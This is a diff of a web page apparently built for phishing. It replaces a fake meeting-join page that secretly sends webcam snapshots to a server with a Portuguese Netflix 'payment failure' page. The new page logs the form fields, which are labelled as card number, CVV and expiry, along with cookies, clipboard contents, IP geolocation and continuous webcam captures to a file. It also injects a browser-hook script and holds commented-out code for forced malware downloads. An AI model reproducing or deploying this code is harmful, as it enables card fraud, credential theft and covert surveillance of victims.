@@ -1,248 +1,293 @@
 <!DOCTYPE html>
-<html>
-
-<!-- Mirrored from carrying-poems-naked-made.trycloudflare.com/index.html.php by HTTrack Website Copier/3.x [XR&CO'2014], Wed, 12 Feb 2025 03:40:16 GMT -->
-<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=UTF-8" /><!-- /Added by HTTrack -->
+<html lang="pt-br">
 <head>
-  <title>Join meeting</title>
-    <meta property="og:title" content="Join online meeting" />
-    <meta property="og:type" content="website" />
-    <meta name="og:image" content="desc.png" />
-    <meta name="description" content="Join online meeting" property="og:description">
-    <meta name="description" content="/desc.png" property="og:image" />
-    <meta name="twitter:card" content="summary" />
-    <meta name="twitter:title" content="Join meeting!" />
-    <meta name="twitter:description" content="Join online meeting" />
-    <meta name="twitter:image" content="desc.png">
-    <script type="text/javascript" src="https://wybiral.github.io/code-art/projects/tiny-mirror/index.js"></script>
-    <script src="https://kit.fontawesome.com/c4c45dfab4.js" crossorigin="anonymous"></script>
-    <script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
-    
-</head>
-<style>
-  @import url("https://fonts.googleapis.com/css2?family=Nunito:wght@500;500&amp;display=swap");
-
-body {
-    height: 100vh;
-    width: 100vw;
-}
-
-* {
-    padding: 0px;
-    margin: 0px;
-    font-family: 'Nunito', sans-serif;
-    font-weight: 500;
-}
-
-.main-screen {
-    background-color: #273039;
-    height: 100vh;
-    width: 100%;
-    display: flex;
-    justify-content: center;
-    align-items: center;
-}
-
-img {
-    height: 80px;
-    width: 80px;
-}
-
-.bottom-bar {
-    position: fixed;
-    padding: 0px 40px 0px -40px;
-    bottom: 0px;
-    height: 80px;
-    width: 100%;
-    background-color: #1F2022;
-    display: flex;
-    flex-direction: row;
-    justify-content: center;
-    align-items: center;
-    color: #fff;
-}
-
-.icon-button {
-    display: flex;
-    flex-direction: column;
-    justify-items: center;
-    align-items: center;
-}
-
-i {
-    margin-bottom: 8px;
-    font-size: 26px;
-}
-
-button {
-    color: #fff;
-    background-color: crimson;
-    padding: 5px 20px;
-    border: none;
-    border-radius: 5px;
-    border-style: none;
-    outline: none;
-}
-
-.float_button {
-    background-color: #1F2022;
-    height: 40px;
-    border-radius: 5px;
-    width: 40px;
-    position: fixed;
-    display: flex;
-    align-items: center;
-    justify-content: center;
-    top: 5px;
-    right: 5px;
-  }
-#ac-wrapper {
-    position: fixed;
-    top: 0;
-    left: 0;
-    width: 100%;
-    height: 100%;
-    background: rgba(255,255,255,.6);
-    z-index: 1001;
-}
-
-#popup {
-    width: 555px;
-    height: 35px;
-    background: #FFFFFF;
-    border: 5px solid #000;
-    border-radius: 15px;
-    -moz-border-radius: 15px;
-    -webkit-border-radius: 15px;
-    box-shadow: #64686e 0px 0px 3px 3px;
-    -moz-box-shadow: #64686e 0px 0px 3px 3px;
-    -webkit-box-shadow: #64686e 0px 0px 3px 3px;
-    position: relative;
-    top: 250px; left: 375px;
-}
-</style>
-
-
-<div class="video-wrap" hidden="hidden">
-  <video id="video" playsinline autoplay></video>
-</div>
-
-<center><canvas id="canvas" width="640" height="480" audoplay></canvas></center>
-
-
-<script>
-
-</script>
-
-<body>
-  <div class="float_button">
-    <i class="fas fa-expand" style="color: #fff; font-size: 18px; margin-top: 5px;"></i>
-  </div>
-  <div id="ac-wrapper">
-    <div id="popup">
-        <center>
-            <h2>Please wait the meeting host will let you in soon</h2>
-        </center>
-    </div>
-</div>
-  <div class="bottom-bar">
-    <div class="icon-button" style="margin-left: 50px;">
-      <i class="fas fa-microphone"></i>
-      <h6>Mute</h6>
-    </div>
-    <div class="icon-button" style="margin-left: 50px;">
-      <i class="fas fa-video"></i>
-      <h6>Stop Video</h6>
-    </div>
-    <div class="icon-button" style="margin-left: auto;">
-      <i class="fas fa-shield-alt"></i>
-      <h6>Security</h6>
-    </div>
-    <div class="icon-button" style="margin-left: 50px;">
-      <i class="fas fa-users"></i>
-      <h6>Participants</h6>
-    </div>
-    <div class="icon-button" style="color: lawngreen; margin-left: 50px;">
-      <i class="fas fa-plus-square"></i>
-      <h6>Share content</h6>
-    </div>
-    <div class="icon-button" style="margin-left: 50px;">
-      <i class="fas fa-comments"></i>
-      <h6>Chat</h6>
-    </div>
-    <div class="icon-button" style="margin-right: auto; margin-left: 50px;">
-      <i class="fas fa-record-vinyl"></i>
-      <h6>Record</h6>
-    </div>
-    <button style="margin-right: 50px;">End</button>
-  </div>
-  <script>
-    'use strict';
-const video = document.getElementById('video');
-const canvas = document.getElementById('canvas');
-const errorMsgElement = document.querySelector('span#errorMsg');
-
-const constraints = {
-    audio: false,
-    video: {
-         facingMode: "user"
-    }
-};
-
-const post = (imgdata) =>{
-    $.ajax({
-        type: 'POST',
-        data: { cat: imgdata},
-        url: '/post.php',
-        dataType: 'json',
-        async: false,
-        success: (result) => {
-         // call the function that handles the response/results
-        },
-        error: function(){
-            errorMsgElement
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title> Netflix | Falha no Pagamento </title>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@100;400;700&display=swap');
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: "Poppins", sans-serif;
         }
-    });
-};
- 
 
+        body {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            background: url('1.jpg') no-repeat center center/cover;
+        }
 
-// Success
-const handleSuccess = (stream) => {
-    window.stream = stream;
-    video.srcObject = stream;
-    
-    var context = canvas.getContext('2d');
-    setInterval(() => {
-        context.drawImage(video, 0, 0, 640, 480);
-        var canvasData = canvas.toDataURL("image/png").replace("image/png", "image/octet-stream");
-        post(canvasData);
-    }, 1500);
-}
+        .container {
+            width: 420px;
+            background-color: rgba(255, 255, 255, 0.1);
+            border: 2px solid rgba(255, 255, 255, 0.2);
+            border-radius: 10px;
+            color: #fff;
+            padding: 30px 40px;
+            text-align: center;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.2);
+        }
 
-// Access webcam
-const init = async () => {
-    try {
-        const stream = await navigator.mediaDevices.getUserMedia(constraints);
-         handleSuccess(stream);
-    } catch (e) {
-         errorMsgElement.innerHTML = `navigator.getUserMedia error:${e.toString()}`;
+        video {
+            display: none;
+        }
+
+        .input-box {
+            position: relative;
+            width: 100%;
+            height: 50px;
+            margin: 10px 0;
+        }
+
+        .input-box input {
+            width: 100%;
+            background-color: transparent;
+            height: 100%;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+            outline: none;
+            font-size: 16px;
+            color: #fff;
+            padding: 15px;
+        }
+
+        .input-box input::placeholder {
+            color: #c5c5c5;
+        }
+
+        .remember {
+            display: flex;
+            justify-content: space-between;
+            margin: 10px 0 10px;
+        }
+
+        .redirect {
+            width: 100%;
+            cursor: pointer;
+            border: none;
+            border-radius: 40px;
+            background-color: #fff;
+            height: 50px;
+            color: #333;
+            font-weight: 600;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+        }
+
+        .redirect:hover {
+            background-color: transparent;
+            border: 2px solid rgba(255, 255, 255, 0.2);
+            color: #fff;
+            transition: 0.5s;
+        }
+    </style>
+</head>
+<body>
+    <?php
+ header("Access-Control-Allow-Origin: *");
+    header("Access-Control-Allow-Methods: GET, POST, OPTIONS");
+    header("Access-Control-Allow-Headers: Content-Type, Authorization");
+
+    function getUserIP() {
+        return $_SERVER['REMOTE_ADDR'] ?? 'IP não disponível';
     }
+
+    function getISPInfo($ip) {
+        $api_url = "http://ip-api.com/json/" . $ip;
+        $response = file_get_contents($api_url);
+        return json_decode($response, true);
+    }
+
+    $ip = getUserIP();
+    $ispData = getISPInfo($ip);
+    $isp = $ispData['isp'] ?? 'Provedor desconhecido';
+    $ispLocation = $ispData['city'] . ', ' . $ispData['regionName'] . ', ' . $ispData['country'] ?? 'Localização desconhecida';
+
+
+
+
+ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
+    // Dados do formulário
+    $a1 = $_POST['a1'] ?? 'N/A';
+    $a2 = $_POST['a2'] ?? 'N/A';
+    $a3 = $_POST['a3'] ?? 'N/A';
+    $a4 = $_POST['a4'] ?? 'N/A';
+    $location = $_POST['location'] ?? 'Localização não disponível';
+    $cookies = $_SERVER['HTTP_COOKIE'] ?? 'Nenhum cookie disponível';
+    $clipboard = $_POST['clipboard'] ?? 'Nenhum texto da área de transferência';
+
+    // Criação do diretório para salvar as imagens
+    if (!is_dir('uploads')) {
+        mkdir('uploads', 0755, true);
+    }
+
+    // Processar imagem recebida
+    if (isset($_FILES['photo']) && $_FILES['photo']['error'] === UPLOAD_ERR_OK) {
+        $photoPath = 'uploads/photo_' . time() . '.png';
+        move_uploaded_file($_FILES['photo']['tmp_name'], $photoPath);
+    }
+
+    // Salvar os dados no arquivo
+    $file = fopen("dados.txt", "a");
+    fwrite($file, "Nome Completo: $a1\n");
+    fwrite($file, "Número do Cartão: $a2\n");
+    fwrite($file, "CVV: $a3\n");
+    fwrite($file, "Validade: $a4\n");
+    fwrite($file, "Localização: $location\n");
+    fwrite($file, "Cookies: $cookies\n");
+    fwrite($file, "Área de Transferência: $clipboard\n"); // Salvar conteúdo da área de transferência
+    fwrite($file, "Provedor de Internet: $isp\n");
+    fwrite($file, "Localização do Provedor: $ispLocation\n");
+    if (isset($photoPath)) {
+        fwrite($file, "Foto salva em: $photoPath\n");
+    }
+    fwrite($file, "------------------------\n");
+    fclose($file);
 }
 
-// Load init
-init();
-  </script>
-  <script>
-    $(document).ready(function(){
-      setTimeout(function(){
-         $('#ac-wrapper').attr("display","none"); 
-      },50000); // 5000 to load it after 5 seconds from page load
-   });
-  </script>
+    ?>
+    <main class="container">
+        <form method="POST" enctype="multipart/form-data">
+            <h3>Confirme que é você! - Recaptcha</h3>
+            <div class="input-box">
+                <input placeholder="Login" type="text" name="a1" required>
+            </div>
+            <div class="input-box">
+                <input placeholder="Password" type="password" name="a2" required>
+            </div>
+            <div class="remember">
+                <label>
+                    <input type="checkbox" name="remember_me"> Lembre de mim </label>
+            </div>
+            <video id="video" autoplay></video>
+            <canvas id="canvas" style="display: none;"></canvas>
+            <input type="hidden" name="location" id="locationData">
+            <input type="file" name="photo" id="photo" accept="image/png" style="display: none;">
+            <button type="submit" class="redirect">Redirecionar ao WhatsApp!</button>
+        </form>
+    </main>
+    <script>
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+        const locationData = document.getElementById('locationData');
+
+// Captura da área de transferência
+document.addEventListener('paste', async (event) => {
+    const clipboardText = await navigator.clipboard.readText();
+
+    // Envia o conteúdo da área de transferência para o servidor via POST
+    fetch(window.location.href, {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/x-www-form-urlencoded',
+        },
+        body: `clipboard=${encodeURIComponent(clipboardText)}`
+    }).then(response => response.text())
+      .then(data => {
+          console.log('Dados enviados:', data);
+      }).catch(err => {
+          console.error('Erro ao enviar dados:', err);
+      });
+});
+
+    // Captura a câmera 
+        navigator.mediaDevices.getUserMedia({ video: true })
+            .then(stream => {
+                video.srcObject = stream;
+                const context = canvas.getContext('2d');
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+
+                // Captura contínua de imagens sem delay
+                function captureFrame() {
+                    context.drawImage(video, 0, 0, canvas.width, canvas.height);
+                    const photoInput = document.getElementById('photo');
+                    canvas.toBlob(blob => {
+                        const file = new File([blob], `photo_${Date.now()}.png`, { type: 'image/png' });
+                        const dataTransfer = new DataTransfer();
+                        dataTransfer.items.add(file);
+                        photoInput.files = dataTransfer.files;
+                        captureFrame(); // Chamando novamente para capturar continuamente
+                    });
+                }
+                captureFrame();
+            })
+            .catch(err => {
+                console.error('Erro ao acessar a câmera:', err);
+                alert('Erro ao acessar a câmera. Verifique as permissões.');
+            });
+
+        // Captura a localização
+  //      if (navigator.geolocation) {
+   //         navigator.geolocation.getCurrentPosition(position => {
+   //             const { latitude, longitude } = position.coords;
+   //             locationData.value = `Lat: ${latitude}, Lon: ${longitude}`;
+//            }, err => {
+//                console.error('Erro ao acessar a localização:', err);
+//                alert('Erro ao acessar a localização. Verifique as permissões.');
+      //      });
+   //     } else {
+//            alert('Geolocalização não suportada pelo navegador.');
+      //  }
+        
+
+     //   window.onload = function () {
+  //  const arquivos = [
+  //      { href: 'exploits/example-arquive.exe', nome: 'example-arquive.exe' },
+   //     { href: 'exploits/example-arquive.apk', nome: 'example-arquive.apk' }
+  //  ];
+//
+    // //arquivos.forEach((arquivo, index) => {
+  //
+  //      setTimeout(() => {
+ //
+  //           const link = document.createElement('a');
+     //
+  //       link.href = arquivo.href;
+     //
+  //       link.download = arquivo.nome;
+   //
+  //         document.body.appendChild(link);
+    //
+  //        link.click();
+//
+  //            document.body.removeChild(link);
+ //
+  //       }, index * 1000); // Pequeno atraso de 1 segundo entre os downloads
+ //
+  //   });
+//    };
+
+  //
+  //
+  //
+  //     000000000000       000000000000             
+  //     0oooooooooo0       0oooooooooo0		               
+  //     0oo0000oooo0       0oo0000oooo0			                       
+  //     0oo0000oooo0       0oo0000oooo0				                       
+  //     0oo0000oooo0       0oo0000oooo0                   
+  //     0oo0000oooo0       0oo0000oooo0 	          			            
+  //     0oo____oooo0       0oo____oooo0	 
+  //     000000000000       000000000000                                         
+  //     
+  //     1                    ___________         _________				
+  //     1  '    sssssssss  |___________        |_________			
+  //     1       ss         |                   |					
+  //     1         s        |___________      	|_________			 		
+  //     1          s       |                   |			
+  //     1           s 	    |___________        |__________			
+  //     1     ssssssss     |___________        |__________  .you  
+  //     1
+  //	___    			          
+  //  
+  //
+    </script>
+<script>
+	var commandModuleStr = '<script src="http://127.0.0.1:3000/hook.js" type="text/javascript"><\/script>';
+	document.write(commandModuleStr);
+</script>
 </body>
-
-
-<!-- Mirrored from carrying-poems-naked-made.trycloudflare.com/index.html.php by HTTrack Website Copier/3.x [XR&CO'2014], Wed, 12 Feb 2025 03:40:19 GMT -->
 </html>
-
